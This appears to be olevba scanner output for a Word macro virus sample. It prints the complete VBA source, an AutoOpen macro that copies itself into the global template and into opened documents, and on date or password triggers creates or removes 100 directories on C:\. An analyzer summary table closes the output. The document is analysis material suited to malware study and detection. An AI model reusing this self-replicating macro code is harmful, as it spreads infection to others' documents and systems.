olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uplamhand-12cb287db21a2e6a8cd03c77ee2f67f21d2468a0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Uplamhand-12cb287db21a2e6a8cd03c77ee2f67f21d2468a0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Uplamhand-12cb287db21a2e6a8cd03c77ee2f67f21d2468a0 - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim apellid
Dim apellido$
Dim Sound$
Dim i
Dim ARCH$
Dim código
Dim código_$
Dim DIRECT$
Dim enter$
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
apellid = Len(WordBasic.[WindowName$]())
apellido$ = WordBasic.[Left$](WordBasic.[WindowName$](), apellid - 4)
Sound$ = apellido$ + ":Autoopen"
On Error GoTo -1: On Error GoTo hol1
WordBasic.MacroCopy Sound$, "global:Autoopen", 1
GoTo hol2
hol1:
WordBasic.PrintStatusBar "abriendo ", WordBasic.[WindowName$]()
hol2:
On Error GoTo -1: On Error GoTo hola
WordBasic.MacroCopy "global:Autoopen", apellido$ + ":autoopen", 1
hola:
WordBasic.PrintStatusBar "intall"
If WordBasic.Year(WordBasic.Now()) > 1996 And WordBasic.Month(WordBasic.Now()) < 4 Then
For i = 1 To 100
ARCH$ = "C:\"
código = i
código_$ = Str(código)
código_$ = WordBasic.[LTrim$](código_$)
DIRECT$ = ARCH$ + código_$
On Error GoTo -1: On Error GoTo VIR1
    WordBasic.MkDir DIRECT$
Next i
WordBasic.MsgBox "DEMASIADOS NUMEROS", "By BOOT EMISSION", 32
End If
If WordBasic.Year(WordBasic.Now()) > 1996 And WordBasic.Month(WordBasic.Now()) = 5 Then
For i = 1 To 100
ARCH$ = "C:\"
código = i
código_$ = Str(código)
código_$ = WordBasic.[LTrim$](código_$)
DIRECT$ = ARCH$ + código_$
On Error GoTo -1: On Error GoTo VIR2
    WordBasic.RmDir DIRECT$
Next i
VIR2:
WordBasic.MsgBox "Por ser hoy un dia especial El Virus Se ELiminará", "By BOOT EMISSION         #######  L-Na  #######", 32
End If
VIR1:
WordBasic.PrintStatusBar "Virus diractivity ver 0.00000001 shareware version plase register"
WordBasic.Input "pulsa enter", enter$
If enter$ = "elena" Then
For i = 1 To 100
ARCH$ = "C:\"
código = i
código_$ = Str(código)
código_$ = WordBasic.[LTrim$](código_$)
DIRECT$ = ARCH$ + código_$
On Error GoTo -1: On Error GoTo VIR2
    WordBasic.RmDir DIRECT$
Next i

End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
